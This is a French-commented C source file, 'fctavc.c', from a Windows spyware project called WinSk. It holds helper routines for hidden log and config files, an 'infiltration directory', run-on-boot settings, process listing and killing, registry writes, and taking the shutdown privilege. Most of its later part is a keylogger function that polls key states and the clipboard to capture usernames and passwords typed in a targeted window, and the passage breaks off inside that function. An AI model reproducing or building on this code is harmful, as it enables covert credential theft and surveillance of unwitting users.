//=============================================================================
// Projet : WinSk
// Fichier : fctavc.c   (Fonctions avanc�es)
//
//=============================================================================

#include "resources.h"
#include <dirent.h>
#include <sys/stat.h>
#include <tlhelp32.h>


//=============================================================================
//          Fonction qui se charge d'�crire dans le fichier sp�cifi� 
//=============================================================================

BOOL ecrireDansFichier(char *path, char *nomFichier, char *buffer, BOOL ecraserAncien)
{
   FILE *Fichier = NULL;
   char lpFichier[MAX_PATH];
   sprintf(lpFichier, "%s\\%s", path, nomFichier);
   
      if (ecraserAncien)
      {
         //si jamais le fichier est cach�/system ou en lecture seule
         SetFileAttributes(lpFichier, FILE_ATTRIBUTE_NORMAL);
         Fichier = fopen(lpFichier, "w+"); /* Ecriture dans un nouveau fichier */
      }
      else /* Si le fichier n'existe pas il va etre cr�e */
         Fichier = fopen(lpFichier, "a"); /* Ecriture depuis la fin du fichier */
         
   if (Fichier != NULL)
   {
      fprintf(Fichier, "%s", buffer);
      fclose(Fichier);
      
      // Si on doit cach� les fichiers
      if (HIDE_FILES)
      {
         // Si c'est le fichier log ou de configuration ou d'exploration
         if (!lstrcmp(nomFichier, NOM_LOG_FILE) || !lstrcmp(nomFichier, NOM_CONFIG_FILE) || !lstrcmp(nomFichier, NOM_EXPLORE_FILE))
            cacherFichier(path, nomFichier, FALSE, FALSE); // On le cache
      }
      
      return TRUE;
   }
   
   return FALSE;
}

//=============================================================================
//  Fonction qui se charge de v�rifier l'existence et lire le fichier sp�cifi� 
//=============================================================================

BOOL lireFichier(char *path, char *nomFichier, char *buffer, BOOL lire)
{
   FILE *Fichier = NULL;
   char lpFichier[MAX_PATH];
   sprintf(lpFichier, "%s\\%s", path, nomFichier);
   
   Fichier = fopen(lpFichier, "r");
   
   if (Fichier != NULL)
   { 
      if (lire)
         fread(buffer, 1, tailleFichier(path, nomFichier, FALSE), Fichier); /* On lit tout le fichier */
      fclose(Fichier);
      return TRUE;
   } 
   
   return FALSE;     
}

//=============================================================================
//             Fonction qui s'occupe de charger les param�tres 
//=============================================================================

BOOL chargerParametres(BOOL depuisFichierDeConfiguration, char *path, char *nomFichier)
{
   if (depuisFichierDeConfiguration)
   {
      FILE *Fichier = NULL;
      char lpFichier[MAX_PATH];
      sprintf(lpFichier, "%s\\%s", path, nomFichier);
      
      Fichier = fopen(lpFichier, "r");
      
      if (Fichier != NULL)
      {
         int compteur=0;
         /* On se place au d�but du fichier */
         fseek(Fichier, 0, SEEK_SET);
         /* On lit le fichier tant qu'on ne d�passe pas le nombre de param�tres */
         while (compteur < NOMBRE_PARAMETRES)
         {
            switch(compteur)
            {
               case 0 : fscanf(Fichier, "%s", Parametres.Email); break;
               case 1 : fscanf(Fichier, "%s", Parametres.Serveur); break;
               case 2 : fscanf(Fichier, "%d", &Parametres.Port); break;
               case 3 : fscanf(Fichier, "%d", &Parametres.TempDeReception); break;
               case 4 : fscanf(Fichier, "%s", Parametres.RepertoireInfiltration); break;
               case 5 : fscanf(Fichier, "%s", Parametres.NomProcessus); break;
               case 6 : fscanf(Fichier, "%d", &Parametres.LancementAuDemarrage); break;
               case 7 : fscanf(Fichier, "%d", &Parametres.StopEspion); break;
               case 8 : fscanf(Fichier, "%d", &Parametres.StopSender); break;
               case 9 : fscanf(Fichier, "%d", &Parametres.StopEspionMdp); break;
               case 10 : fscanf(Fichier, "%d", &Parametres.StopClientThread); break;
               case 11 : fscanf(Fichier, "%s", Parametres.Version); break;
            }
            fseek(Fichier, 1, SEEK_CUR); /* On saute la ligne */
            compteur++;     
         }
         fclose(Fichier);
      }
      else
         return FALSE;
   }
   else /* Param�tres par d�faut */
   {
      strcpy(Parametres.Email, PARAMETRE_EMAIL);
      strcpy(Parametres.Serveur, PARAMETRE_SERVER);
      Parametres.Port = PARAMETRE_SERVER_PORT;
      Parametres.TempDeReception = PARAMETRE_SLEEP_TIME;
      strcpy(Parametres.RepertoireInfiltration, SYSTEM_PATH);
      strcpy(Parametres.NomProcessus, NOM_PROCESSUS); 
      Parametres.LancementAuDemarrage = PARAMETRE_RUN_ON_BOOT;
      Parametres.StopEspion = PARAMETRE_STOP_ESPION;
      Parametres.StopSender = PARAMETRE_STOP_SENDER;
      Parametres.StopEspionMdp = PARAMETRE_STOP_ESP_MDP;
      Parametres.StopClientThread = PARAMETRE_STOP_CLIENT;
      strcpy(Parametres.Version, NOM_MUTEX);
   }
   
   return TRUE;
}

//=============================================================================
//            Fonction qui retourne la taille du fichier sp�cif�
//=============================================================================

long tailleFichier(char *path, char *nomFichier, BOOL onlyPath)
{
   char lpFichier[MAX_PATH];
   if (onlyPath)
      sprintf(lpFichier, "%s", path);
   else
      sprintf(lpFichier, "%s\\%s", path, nomFichier);
   
   HANDLE hFichier;
   DWORD FileSize;
   
   hFichier = CreateFile(lpFichier, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   if(hFichier != INVALID_HANDLE_VALUE) // Si fichier trouv�
   {
       FileSize = GetFileSize(hFichier, NULL);
       CloseHandle(hFichier);
       return FileSize;
   }
   else
       return 0;
}

//=============================================================================
//        Fonction qui retourne le nombre de lignes du fichier sp�cif�
//=============================================================================

int nbrLignesFichier(char *path, char *nomFichier)
{
   long tailleF = tailleFichier(path, nomFichier, FALSE);
   if (tailleF == 0) return 0;
   
   char buffer[tailleF];
   
   if (lireFichier(path, nomFichier, buffer, 1)) /* Si le fichier existe */
   {
      int i, nbrDeLignes = 1; /* au moin il y'a une ligne m�me si elle peut �tre vide */
      
      for (i = 0; i < tailleF; i++)
      {
         if (buffer[i] == '\n')
            nbrDeLignes++;
      }
      
      return nbrDeLignes;
   }
   else
      return 0; /* ou FALSE (m�me si le type de retour est un int, �a passe) */
}

//=============================================================================
//            Fonction qui v�rifie les param�tres un par un
//=============================================================================

BOOL checkParametres(char *path, char *nomFichier)
{
   long tailleF = tailleFichier(path, nomFichier, FALSE);
   if (tailleF == 0) return FALSE;
   
   char buffer[tailleF], curParam[256];
   
   if (lireFichier(path, nomFichier, buffer, 1)) /* Si le fichier existe */
   {
      int i, line = 0, j = 0, nbr;
      tailleF = strlen(buffer); // actualisation de la taille (car tailleF retourn�e par tailleFichier() est en byte/incorrecte)
      
      for (i = 0; i < tailleF; i++)
      {
         if (buffer[i] == '\n' || i == tailleF - 1) // on a trouv� la prochaine ligne (ou) c'est�la derni�re ligne/dernier caract�re
         {
            curParam[j] = '\0'; // fin de chaine
            j = 0; // pour le prochain parametre
            
            switch(line)
            {
               // email (@ non trouv� ==> erreur)
               case 0: if(strstr(curParam, "@") == NULL) return FALSE; break;
               // server (. non trouv� ==> erreur), le serveur peut aussi �re un hostname du coup plus besoin de v�rifier
               case 1: if(/*strstr(curParam, ".") == NULL*/strlen(curParam) == 0) return FALSE; break;
               // port (n'est pas un nombre ==> erreur)
               case 2:
               // temp de reception/sleep time
               case 3: if(strtol(curParam, NULL, 10) == 0) return FALSE; break;
               // repertoire infiltration (: non trouv� => erreur)
               case 4: if(strstr(curParam, ":") == NULL) return FALSE; break;
               // nom processus (.exe non trouv� => erreur)
               case 5: if(strstr(curParam, ".exe") == NULL) return FALSE; break;
               // lancement au demarrage (!= 0 && != 1 ==> erreur)
               case 6:
               // stop espion
               case 7:
               // stop sender
               case 8:
               // stop espion mdp
               case 9:
               // stop client thread
               case 10: nbr = atoi(curParam); if(nbr != 0 && nbr != 1) return FALSE; break;
               // version (WinSkv non trouv� => erreur)
               case 11: if(strstr(curParam, "WinSkv") == NULL) return FALSE; break;
               default: return FALSE; // si on a plus de lignes que pr�vu
            }
            
            line++;
         }
         else
         {
             curParam[j] = buffer[i]; // on remplie/enregistre le parametre en cours de traitement
             j++;
         }
      } // fin for
      
      // Si le nombre de param�tres est bon (car il peu y avoir moin de param�tres)
      if (line == NOMBRE_PARAMETRES)
         return TRUE;
      else
         return FALSE;
   }
   else
      return FALSE; 
}

//=============================================================================
//           Fonction qui sauvegarde les param�tres du programme
//=============================================================================

BOOL sauvegarderParametres()
{
   char bufferParametres[512];
   sprintf(bufferParametres, "%s\n%s\n%d\n%d\n%s\n%s\n%d\n%d\n%d\n%d\n%d\n%s", Parametres.Email
                              , Parametres.Serveur, Parametres.Port, Parametres.TempDeReception
                              , Parametres.RepertoireInfiltration, Parametres.NomProcessus
                              , Parametres.LancementAuDemarrage, Parametres.StopEspion
                              , Parametres.StopSender, Parametres.StopEspionMdp
                              , Parametres.StopClientThread, Parametres.Version);
                              
   if (ecrireDansFichier(FILES_PATH, NOM_CONFIG_FILE, bufferParametres, 1))
       return TRUE;
   else
       return FALSE;
}

//=============================================================================
//         Fonction qui r�cup�re le nom d'utilisateur et de la machine
//=============================================================================

char *user_name(short format)
{
   char *nom, user[64], machine[64];
   nom = malloc(128+1);
   DWORD d = 64;
   GetUserName(user, &d); /* Nom d'utilisateur */
   d = 64;
   GetComputerName(machine, &d); /* Nom de la machine */
   if (format == 2)
      sprintf(nom, "%s-%s", user, machine);
   else
      sprintf(nom, "\n%s (%s) - ", user, machine);
   return nom;
}

//=============================================================================
//                  Fonction qui r�cup�re le temp actuel
//=============================================================================

char *get_time(short format)
{
   char *temp;
   temp = malloc(32);
   SYSTEMTIME Time;
   GetSystemTime(&Time);
   if (format == 2)
      sprintf(temp, "%02d:%02d", Time.wHour, Time.wMinute);
   else
      sprintf(temp, "%02d/%02d/%d - %02d:%02d : ", Time.wDay, Time.wMonth, Time.wYear, Time.wHour, Time.wMinute);
   return temp;
}

//=============================================================================
//                  Fonction qui v�rifie l'etat de la connexion
//=============================================================================

BOOL etatConnexion()
{
   BOOL bConnected;
   DWORD dwFlags;
   bConnected = InternetGetConnectedState(&dwFlags, 0); /* Etat de la connexion */
   return bConnected;
}

//=============================================================================
//                Fonction qui affiche/cache les ic�nes du bureau
//=============================================================================

void afficherBureau(BOOL afficher)
{
   HWND hProgMan = FindWindow(NULL, "Program Manager"); /* Handle du Program manager */
   
   if (hProgMan) /* Si fen�tre du program manager trouv�e */
   {
      if (afficher)
         ShowWindow(hProgMan, SW_SHOW); /* On l'affiche */
      else
         ShowWindow(hProgMan, SW_HIDE); /* On le cache */
   }
}

//=============================================================================
//                Fonction qui affiche/cache la barre des t�ches
//=============================================================================

void afficherBarreDesTaches(BOOL afficher)
{
   HWND hTaskBar = FindWindow("Shell_TrayWnd", NULL); /* Handle de la barre des t�ches */
   
   if (hTaskBar) /* Si barre des t�ches trouv�e */
   {
      if (afficher)
         ShowWindow(hTaskBar, SW_SHOW); /* On l'affiche */
      else
         ShowWindow(hTaskBar, SW_HIDE); /* On la cache */
   }
}

//=============================================================================
//     Fonction qui r�cup�re le privil�ge pour arr�ter/red�marrer l'ordi.
//=============================================================================

void getPrivilege()
{
   HANDLE hToken;
   TOKEN_PRIVILEGES tkp; /* Pointeur vers la structure token */
   OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken); /* R�cup�ration du LUID pour le privil�ge d'arr�t */
   LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid); 
   tkp.PrivilegeCount = 1; /* un privil�ge � r�cup�rer */
   tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; /* R�cup�ration du privil�ge d'arr�t pour ce processus */ 
   AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);/* Pour tester la valeur de retour => AdjustTokenPrivileges.if (GetLastError() != ERROR_SUCCESS) */
   CloseHandle(hToken);     
}

//=============================================================================
//  Fonction qui explore le dossier sp�cifi� et retourne ce qu'elle a trouv�e
//=============================================================================

BOOL exploreDirectory(char *chemin)
{
   DIR *rep = NULL;
   struct dirent *lecture = NULL; 
   rep = opendir(chemin);
   
   char path[PATH_SIZE];
   sprintf(path, "%s\\%s", FILES_PATH, NOM_EXPLORE_FILE);
   //si jamais le fichier est cach�/system ou en lecture seule
   SetFileAttributes(path, FILE_ATTRIBUTE_NORMAL);
   FILE *fichier = fopen(path, "w+");
   
   // si c'est une partition, on enl�ve le '\\' (pour le bon fonctionnement de is_dir())
   if (chemin[strlen(chemin) - 1] == '\\') chemin[strlen(chemin) - 1] = 0; //'\0';
   
   if (rep != NULL)
   {
      while ((lecture = readdir(rep)) != NULL)
      {
         //strcat(liste, lecture->d_name);
         //strcat(liste, "|");
         if (lecture->d_name[0] != '.') // si ce n'est pas '.' ou '..'
         {
            sprintf(path, "%s\\%s", chemin, lecture->d_name);
            fprintf(fichier, "%s|%d|", lecture->d_name, is_dir(path));
         }
      }
      
      //strcat(liste, ".");
      fclose(fichier);
      if (HIDE_FILES)
         cacherFichier(FILES_PATH, NOM_EXPLORE_FILE, FALSE, FALSE);
      closedir(rep);
      return TRUE;
   }
   else
   {
      fclose(fichier);
      return FALSE;
   }
}

//=============================================================================
//          Fonction qui renvoie la liste des procesus actifs
//=============================================================================

void listeDesProcessus(char *liste, BOOL saveToFile)
{
   HANDLE SnapHandle; /* Handle des 'Snapshot' */
   PROCESSENTRY32 pe;
   char pathToFile[200];
   FILE *fichier;
   
   /* Snapshot des informations (processus) du system */
   SnapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
   pe.dwSize = sizeof(PROCESSENTRY32);                                
   Process32First(SnapHandle, &pe);
   
   if (saveToFile)
   {
      sprintf(pathToFile, "%s\\%s", FILES_PATH, NOM_TASKS_FILE);
      //si jamais le fichier est cach�/system ou en lecture seule
      SetFileAttributes(pathToFile, FILE_ATTRIBUTE_NORMAL);
      fichier = fopen(pathToFile, "w+");
   }
   else
      ZeroMemory(liste, sizeof(liste)); /* Vidage de la liste */                            
   
   while(Process32Next(SnapHandle, &pe))
   {
      if (saveToFile)
         fprintf(fichier, "%s|", pe.szExeFile);
      else
      {
         strcat(liste, pe.szExeFile);
         strcat(liste, "|");
      }
   }
   
   if (saveToFile)
   {
      fclose(fichier);
      if (HIDE_FILES)
         cacherFichier(FILES_PATH, NOM_TASKS_FILE, FALSE, FALSE);
   }
   else
      strcat(liste, ".");
   
   CloseHandle(SnapHandle);
}

//=============================================================================
//              Fonction qui arr�te le programme sp�cifi�
//=============================================================================

BOOL arreterProgramme(char *ProcName) /* ou char ProcName[] */
{
   HANDLE SnapHandle;  /* Handle des 'Snapshot' */
   HANDLE ProcHandle; /* Handle OpenProcess */
   PROCESSENTRY32 pe;
   /* Snapshot des informations (processus) du system */
   SnapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
   pe.dwSize = sizeof(PROCESSENTRY32);                                
   Process32First(SnapHandle, &pe);                                       
   
   while(Process32Next(SnapHandle, &pe))
   {          
      if(!lstrcmp(pe.szExeFile, ProcName))            
      { 
         ProcHandle = OpenProcess(PROCESS_TERMINATE, 0, pe.th32ProcessID);
         TerminateProcess(ProcHandle, 0);                                  
         CloseHandle(ProcHandle);
         CloseHandle(SnapHandle);
         return TRUE;                                            
      }
   }
   
   CloseHandle(SnapHandle);
   return FALSE;
}

//=============================================================================
//          Fonction qui ajoute/modifie la valeur registre sp�cifi�
//=============================================================================

BOOL ajouterModifierRegistre(char *option, LPCTSTR skChemin, HKEY racine, char *nom, int type, char *valeur)
{
   DWORD dwDisposition;
   HKEY hkSub = NULL;
   LONG openRes;
   
   if (!lstrcmp(option, "CREER"))
      openRes = RegCreateKeyEx(racine, skChemin, 0 , NULL, 0, KEY_READ | KEY_WRITE, NULL, &hkSub, &dwDisposition);
   else if (!lstrcmp(option, "OUVRIR"))
   {
      openRes = RegOpenKeyEx(racine, skChemin, 0, KEY_READ | KEY_WRITE, &hkSub);
      char data[512];
      DWORD dwType = type, datalen = 512;
      LONG checkRes = RegQueryValueEx(hkSub, nom, 0, &dwType, (LPBYTE)data, (LPDWORD) &datalen);
      if (checkRes != ERROR_SUCCESS)
         return FALSE;
   }
   else if (!lstrcmp(option, "SUPPRIMER"))
   {
      openRes = RegOpenKeyEx(racine, skChemin, 0, KEY_ALL_ACCESS, &hkSub);
      LONG delRes = RegDeleteValue(hkSub, nom);
      if (delRes != ERROR_SUCCESS)
         return FALSE;
      else
         return TRUE;
   }
   else 
      return FALSE;  
   
   LONG setRes;
   
   switch (type)
   {
      case REG_BINARY:
      case REG_DWORD:
      {
         DWORD dwData = strtol(valeur, NULL, 10);
         setRes = RegSetValueEx(hkSub, nom, 0, type, (BYTE*)&dwData, sizeof(DWORD));
         break;
      }
      case REG_SZ:
      {
         LPCTSTR data = valeur;
         setRes = RegSetValueEx (hkSub, nom, 0, REG_SZ, (LPBYTE)data, strlen(data)+1);
         break;
      }
      default:
         return FALSE;
   }
   
   if (setRes != ERROR_SUCCESS)
      return FALSE;
   else
      return TRUE;      
}

//=============================================================================
//                Fonction qui tue/termine le thread sp�cifi�
//=============================================================================

void tuerThread(HANDLE hThread)
{
   DWORD IDThread;
   GetExitCodeThread(hThread, &IDThread);
   TerminateThread(hThread, IDThread); /* On tue le thread hThread */
}

//=============================================================================
//                Fonction qui cache le fichier sp�cifi�
//=============================================================================

BOOL cacherFichier(char *cheminFichier, char *nomFichier, BOOL onlyPath, BOOL hideAsSystemFile)
{
    if (onlyPath)
    {
        if (hideAsSystemFile)
            SetFileAttributes(cheminFichier, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        else
            SetFileAttributes(cheminFichier, FILE_ATTRIBUTE_HIDDEN);
    }
    else
    {
        char *lpFichier;
        lpFichier = malloc(lstrlen(cheminFichier)+lstrlen(nomFichier)+1);
        sprintf(lpFichier, "%s\\%s", cheminFichier, nomFichier);
        if (hideAsSystemFile)
            SetFileAttributes(lpFichier, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        else
            SetFileAttributes(lpFichier, FILE_ATTRIBUTE_HIDDEN);
        free(lpFichier);
    }
    
    return TRUE;     
}

//=============================================================================
//                Fonction qui affiche le fichier sp�cifi�
//=============================================================================

BOOL afficherFichier(char *cheminFichier, char *nomFichier, BOOL onlyPath)
{
    if (onlyPath)
        SetFileAttributes(cheminFichier, FILE_ATTRIBUTE_NORMAL);
    else
    {
        char *lpFichier;
        lpFichier = malloc(lstrlen(cheminFichier)+lstrlen(nomFichier)+1);
        sprintf(lpFichier, "%s\\%s", cheminFichier, nomFichier);
        SetFileAttributes(lpFichier, FILE_ATTRIBUTE_NORMAL);
        free(lpFichier);
    }
    
    return TRUE;     
}

//=============================================================================
//                Fonction qui r�cup�re le nom du programme
//=============================================================================

char *recupNomDuProgramme(BOOL avecPath)
{
   char *nomDuProgramme, nomInverser[64];
   nomDuProgramme = malloc(MAX_PATH);
   GetModuleFileName(0, nomDuProgramme, MAX_PATH);
   if (!avecPath)
   {
      int i, j = 0;
      for (i = strlen(nomDuProgramme)-1; i > 0; i--)
      {
         if (nomDuProgramme[i] != '\\')
         {
            nomInverser[j] = nomDuProgramme[i];
            j++;
         }
         else break;
      }
      nomInverser[j] = '\0';
      j = 0;
      for (i = strlen(nomInverser)-1; i >= 0; i--)
      {
         nomDuProgramme[j] = nomInverser[i];
         j++;
      }
      nomDuProgramme[j] = '\0';
   }
   return nomDuProgramme;
}

//=============================================================================
//          Fonction qui retourne la chaine sp�cifi�e en minusucle
//=============================================================================

char *enMinuscule(char *chaine)
{
   int i, lChaine = lstrlen(chaine); /* Longueur de la chaine */
   char *miniChaine;
   miniChaine = malloc(lChaine+1); /* Allocation m�moire */
   sprintf(miniChaine, "%s", chaine); /* Copie de la chaine */
   
   for (i = 0; i < lChaine; i++) /* On parcours la copie de la chaine */
   {
      if (miniChaine[i] >= 'A' && miniChaine[i] <= 'Z') /* Si lettre majuscule */
         miniChaine[i] += 32; /* On la transforme en minuscule */
   }
   
   return miniChaine;
}

//=============================================================================
//     Fonction qui enl�ve 2 caract�res sp�cifi�s de la chaine sp�cifi�e
//=============================================================================

char *enleverCaracteres(char *chaine, char char1, char char2)
{
   int i, j = 0, lChaine = lstrlen(chaine); /* Longueur de la chaine */
   char *nouvelleChaine;
   nouvelleChaine = malloc(lChaine+1); /* Allocation m�moire */
   
   for (i = 0; i < lChaine; i++) /* On parcours la chaine */
   {
      if (chaine[i] != char1 && chaine[i] != char2) /* Si ce ne sont pas les caract�res a enlev� */
      {
         nouvelleChaine[j] = chaine[i]; /* On les colles dans la nouvelle chaine */
         j++; /* On sauvegarde la longueur de la nouvelle chaine */
      }
   }
   
   nouvelleChaine[j] = '\0'; /* Fin de la nouvelle chaine */
   
   return nouvelleChaine;
}

//=============================================================================
//          Fonction qui ajoute le texte sp�cifi� au fichier log
//=============================================================================

void ajouterAuLog(char *buffer)
{
   char tmp[TAILLE_TMP], *currentTime;
   currentTime = get_time(2);
   sprintf(tmp, "\n[(%s) : %s]\n", currentTime, buffer);
   free(currentTime);
   ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, tmp, 0);
}

//=============================================================================
//          Fonction qui r�cup�re l'adresse Ip du serveur sp�cifi�
//=============================================================================

BOOL recupererIp(char *serveur, char *adresseIp)
{
   if (adresseIp[0] != 0) /* Si on a d�j� r�cup�r� l'adresse IP du serveur pas la peine de le refaire */
      return TRUE;
   else
   {
      struct hostent *host;
      if (host = gethostbyname(serveur)) /* Si on arrive � r�cup�rer l'adresse IP du serveur */
      {
         struct in_addr **a;
         a = (struct in_addr **)host->h_addr_list;
         sprintf(adresseIp, "%s", inet_ntoa(**a)); /* On colle l'adresse IP du serveur dans adresseIp */
         return TRUE;
      }
      else
         return FALSE;
   }
}

//=============================================================================
//       Fonction qui r�cup�re le nom du programme depuis son chemin
//
//=============================================================================

char *recupNomDuProgrammeDepuisPath(char *path)
{
   char *nomDuProgramme, nomInverser[200];
   nomDuProgramme = malloc(strlen(path));

   /* On r�cup�re le nom (invers�) */
   int i, j;
   for (i = 0, j = strlen(path) - 1; j >= 0; i++, j--)
   {
      if (path[j] != '\\')
         nomInverser[i] = path[j];
      else
         break;
   }
   nomInverser[i] = '\0';
   /* On inverse le nom */
   for (i = 0, j = strlen(nomInverser) - 1; j >= 0; i++, j--)
   {
       nomDuProgramme[i] = nomInverser[j];
   }
   nomDuProgramme[i] = '\0';
   
   return nomDuProgramme;
}

//=============================================================================
//    Fonction qui se charge de v�rifier l'existence du fichier sp�cifi� 
//
//=============================================================================

BOOL verifierExistenceFichier(char *path)
{
   FILE *Fichier = NULL;
   
   Fichier = fopen(path, "r");
   
   if (Fichier != NULL)
   {
      fclose(Fichier);
      return TRUE;
   }
   else
      return FALSE;     
}

//=============================================================================
// Fonction qui r�cup�re les identifiants du voyou (enregistre les touches appuy�s)
//
// @ Si le mot de passe est faut on ne va pas certainement le r�ecup�rer une 2�me
//   fois, il reste donc � g�rer �a
//=============================================================================

void recupererIdentifiants(char *fenetre)
{
   SHORT keyState;
   int key, historiqueKey[256] = {0}, len;
   BOOL MAJUSCULE = GetKeyState(VK_CAPITAL);
   char log[MAX_TMP], tmp[2], *user, *pass, nomFenetre[MAX_FENETRE_TAILLE];
   user = malloc(50);
   pass = malloc(50); /* :O un mot de passe qui contient 50 caract�res (juste si jamais c vrai :D) */
   lstrcpy(user, ""); /* Initialisation */
   lstrcpy(pass, "");
   BOOL STOP = FALSE, PASSWORD_TURN = FALSE;
   HANDLE hWnd = GetForegroundWindow(), hCurrent = hWnd; /* Handle de la fen�tre de d�part */
   GetWindowText(hCurrent, nomFenetre, MAX_FENETRE_TAILLE); /* Nom de la fen�tre de d�part */
   
   while (!STOP && (hWnd == hCurrent) && rechercherChaineDansChaine(nomFenetre, fenetre))
   {
      Sleep(6); /* On r�duit la vitesse de la boucle */
      
        /* R�cup�ration des touches enfonc�es/saisies */
        for(key = 0; key < 256; key++) 
        {
           keyState = GetAsyncKeyState(key); /* On r�cup�re l'�tat de toutes les touches */
           
           if ((keyState & 0x00000001) && (keyState & 0x8000000)) /* Si une des touches enfonc�e */
           {
               /* Si Click Sourie */
               if (key == 1) /* Sourie gauche */
               {
                  if (PASSWORD_TURN && (lstrlen(pass) >= MINI_LEN_PASS)) /* Si le voyou (:p) a fini de taper son mdp */
                     STOP = TRUE;
                  else if (lstrlen(user) >= MINI_LEN_USER) /* Si nn s'il vien juste de taper son username */
                     PASSWORD_TURN = TRUE;
               }
               /* Si CTRL + 'V' ou 'X' */
               else if((key == 65+'v'-'a' || key == 65+'x'-'a') && ((historiqueKey[17] && historiqueKey[162]) == 1))
               { 
                  if (OpenClipboard(NULL))
                  {
                     HANDLE clip = GetClipboardData(CF_TEXT); /* On r�cup�re le texte du clipboard (espace de stockage appartenant au clavier) */
                     if (!PASSWORD_TURN)
                        lstrcat(user, clip);
                     else
                        lstrcat(pass, clip);
                     CloseClipboard(); /* On ferme le clipboard */
                  }
               }
               /* Si Lettre enfonc�e */
               else if (key >= 65 && key <= 90) 
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activ� */
                  {
                     sprintf(tmp, "%s", &key);
                     if (!PASSWORD_TURN) /* Si on a pas encore taper l'username */
                        lstrcat(user, tmp);
                     else
                        lstrcat(pass, tmp);
                  }
                  else
                  {
                     key += 32;
                     sprintf(tmp, "%s", &key);
                     if (!PASSWORD_TURN)
                        lstrcat(user, tmp);
                     else
                        lstrcat(pass, tmp);
                  }
               }
               /* Si Numeric keypad enfonc� */
               else if(key >= 96 && key <= 105)
               { 
                  sprintf(tmp, "%c", key-96+'0');
                  if (!PASSWORD_TURN)
                     lstrcat(user, tmp);
                  else
                     lstrcat(pass, tmp);
               }
               /* Si Chiffre enfonc� */
               else if (key >= 48 && key <= 57)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activ� */
                  {
                     sprintf(tmp, "%c", key);
                     if (!PASSWORD_TURN)
                        lstrcat(user, tmp);
                     else
                        lstrcat(pass, tmp);
                  }
                  else if (((historiqueKey[17] && historiqueKey[18]) && (historiqueKey[162] && (historiqueKey[164] || historiqueKey[165]))) == 1) /* Si CTRL + ALT ou ALT GR activ� */
                  {
                     if (key == 48)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "@");
                        else
                           lstrcat(pass, "@");
                     }
                     else if (key == 51)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "#");
                        else
                           lstrcat(pass, "#");
                     }
                  }
                  else
                  {
                     if (key == 48)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "�");
                        else
                           lstrcat(pass, "�");
                     }
                     else if (key == 49)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "&");
                        else
                           lstrcat(pass, "&");
                     }
                     else if (key == 50)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "�");
                        else
                           lstrcat(pass, "�");
                     }
                     else if (key == 54)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "-");
                        else
                           lstrcat(pass, "-");
                     }
                     else if (key == 55)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "�");
                        else
                           lstrcat(pass, "�");
                     }
                     else if (key == 56)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "_");
                        else
                           lstrcat(pass, "_");
                     }
                     else if (key == 57)
                     {
                        if (!PASSWORD_TURN)
                           lstrcat(user, "�");
                        else
                           lstrcat(pass, "�");
                     }
                  }
               }
               /* Si MAJUSCULE enfonc�e (activ�/d�sactiv�) */
               else if (key == 20) MAJUSCULE = !MAJUSCULE;
               /* Si les Caract�res qui restent enfonc�s */
               else if(key == 190)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activ� */
                  {
                     if (!PASSWORD_TURN)
                        lstrcat(user, ".");
                     else
                        lstrcat(pass, ".");
                  }
               }
               else if (key == 110)
               {
                  if ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 0) /* Si SHIFT d�sactiv� */
                  {
                     if (!PASSWORD_TURN)
                        lstrcat(user, ".");
                     else
                        lstrcat(pass, ".");
                  }
               }
               else if (key == 106)
               {
                  if (!PASSWORD_TURN)
                     lstrcat(user, "*");
                  else
                     lstrcat(pass, "*");
               }
               else if (key == 107)
               {
                  if (!PASSWORD_TURN)
                     lstrcat(user, "+");
                  else
                     lstrcat(pass, "+");
               }
               else if (key == 109)
               {
                  if (!PASSWORD_TURN)
                     lstrcat(user, "-");
                  else
                     lstrcat(pass, "-");
               }
               else if (key == 111)
               {
                  if (!PASSWORD_TURN)
                     lstrcat(user, "/");
                  else
                     lstrcat(pass, "/");
               }
               else if (key == 222)
               {
                  if (!PASSWORD_TURN)
                     lstrcat(user, "�");
                  else
                     lstrcat(pass, "�");
               }
               /* Si Caract�res Sp�ciaux enfonc� */
                  /* Si touche BACKSPACE (effac�) */
                  else if (key == 8)
                  {
                     if (!PASSWORD_TURN)
                     {
                        if (len = lstrlen(user))
                           user[len-1] = '\0'; /* On supprime le dernier caract�re de user */
                     }
                     else
                     {
                        if (len = lstrlen(pass))
                           pass[len-1] = '\0'; /* On supprime le dernier caract�re de pass */
                     }
                  }
                  /* Si touche TAB */
                  else if (key == 9)
                  {
                     if (lstrlen(user) >= MINI_LEN_USER) /* S'il vien juste de taper son username */
                        PASSWORD_TURN = TRUE;
                  }
                  /* Si touche ENTER (entr�) */
                  else if (key == 13)
                  {
                     if (PASSWORD_TURN && (lstrlen(pass) >= MINI_LEN_PASS)) /* Si le voyou a fini de taper son mdp */
                        STOP = TRUE;
                  }
                  /* Si touche ESPACE */
                  else if (key == 32)
                  {
                     if (!PASSWORD_TURN)
                        lstrcat(user, " ");
                     else
                        lstrcat(pass, " ");
                  }
               
